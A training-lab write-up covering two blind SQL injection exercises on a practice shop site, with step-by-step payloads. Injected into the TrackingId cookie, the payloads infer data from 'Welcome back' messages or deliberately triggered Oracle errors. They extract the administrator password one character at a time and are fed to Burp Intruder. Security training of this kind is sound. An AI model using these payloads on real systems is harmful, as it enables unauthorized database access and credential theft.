# Lab 11: Blind SQL Injection with Conditional Responses

## Lab Objective:

The objective of this lab is to demonstrate the exploitation of a blind SQL injection vulnerability to retrieve the password of the administrator user. By manipulating the tracking cookie value and observing the presence or absence of the "Welcome back" message in the application's response, we can infer the results of the SQL query and extract the password character by character.

## Lab Procedure:

1. **Accessing the Lab:**
    - Visit the front page of the shop and use Burp Suite to intercept and modify the request containing the TrackingId cookie. Let's say the original value of the cookie is TrackingId=<id>.
2. **Exploiting the Blind SQL Injection Vulnerability:**
    - Modify the TrackingId cookie, changing it to:
        
        ```
        TrackingId=<id>' AND '1'='1
        ```
        
    - Verify that the "Welcome back" message appears in the response.
    - Change the TrackingId cookie to:
        
        ```
        TrackingId=<id>' AND '1'='2
        ```
        
    - Verify that the "Welcome back" message does not appear in the response.
    - Change the TrackingId cookie to:
        
        ```
        TrackingId=<id>' AND (SELECT 'a' FROM users LIMIT 1)='a
        ```
        
    - Verify that the condition is true, confirming the existence of the table users.
    - Change the TrackingId cookie to:
        
        ```
        TrackingId=<id>' AND (SELECT 'a' FROM users WHERE username='administrator')='a
        ```
        
    - Verify that the condition is true, confirming the existence of the user administrator.
3. **Determining the Password Length:**
    - Change the TrackingId cookie to:
        
        ```
        TrackingId=<id>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
        ```
        
    - Verify that the condition is true, confirming that the password is greater than 1 character in length.
    - Send a series of follow-up values to test different password lengths using Burp Intruder.
4. **Determining the Password Characters:**
    - Use Burp Intruder to send suitable payloads to test the character at each position of the password.
    - Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.
5. **Logging in as Administrator:**
    - Once the password characters are determined, log in as the administrator user using the obtained password.

# Lab 12: Blind SQL Injection with Conditional Errors

## Lab Objective:

The objective of this lab is to demonstrate the exploitation of a blind SQL injection vulnerability to retrieve the password of the administrator user. By manipulating the tracking cookie value and observing the application's response to different conditions, we can infer information about the database structure and extract the password character by character.

## Tools Used:

1. **Burp Suite:** Used for intercepting and modifying HTTP requests.
2. **Browser:** Used for accessing the vulnerable web application.

## Lab Procedure:

1. **Accessing the Lab:**
    - Visit the front page of the shop and use Burp Suite to intercept and modify the request containing the TrackingId cookie. Let's say the original value of the cookie is `TrackingId=<id>`.
2. **Exploiting the Blind SQL Injection Vulnerability:**
    - Modify the TrackingId cookie, appending a single quotation mark to it:
        
        ```
        TrackingId=<id>'
        ```
        
    - Verify that an error message is received.
    - Change the TrackingId cookie to two quotation marks:
        
        ```
        TrackingId=<id>''
        ```
        
    - Verify that the error disappears, indicating a syntax error.
    - Construct a subquery using valid SQL syntax:
        
        ```
        TrackingId=<id>'||(SELECT '' FROM dual)||
        ```
        
    - Verify that no error is received, indicating the use of Oracle database.
    - Test an invalid query with valid SQL syntax:
        
        ```
        TrackingId=<id>'||(SELECT '' FROM not-a-real-table)||
        ```
        
    - Receive an error, confirming the processing of injection as a SQL query.
    - Verify the existence of the users table:
        
        ```
        TrackingId=<id>'||(SELECT '' FROM users WHERE ROWNUM = 1)||
        ```
        
    - Confirm that no error is received, indicating the existence of the table.
    - Test a condition:
        
        ```
        TrackingId=<id>'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||
        ```
        
    - Receive an error, demonstrating conditional error response.
    - Check if the username administrator exists:
        
        ```
        TrackingId=<id>'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||
        ```
        
    - Confirm the existence of the user by receiving an error.
3. **Determining the Password Length:**
    - Test the password length:
        
        ```
        TrackingId=<id>'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||
        ```
        
    - Continue testing different password lengths until the error disappears.
4. **Determining the Password Characters:**
    - Use Burp Intruder to test the character at each position of the password.
    - Launch the attack and review the results to determine the value of each character.
5. **Logging in as Administrator:**
    - Once the password characters are determined, log in as the administrator user using the obtained password.
